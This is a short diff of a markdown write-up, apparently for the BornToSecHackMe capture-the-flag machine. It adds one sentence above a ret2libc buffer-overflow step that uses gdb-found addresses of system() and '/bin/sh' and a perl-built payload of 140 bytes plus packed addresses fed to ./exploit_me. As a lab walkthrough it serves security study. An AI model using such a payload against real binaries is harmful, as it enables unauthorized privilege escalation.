@@ -652,6 +652,7 @@ $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
 (gdb) find &system,+9999999,"/bin/sh"
 0xb7f8cc58
 ```
+Once all information are gathered, the exploit can be applied.
 ```shell
 zaz@BornToSecHackMe:~$ ./exploit_me `perl -e 'print "A"x140 . pack("V", 0xb7e6b060) . pack("V", 0xb7e5ebe0) . pack("V", 0xb7f8cc58)'`
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`���AAAAX���
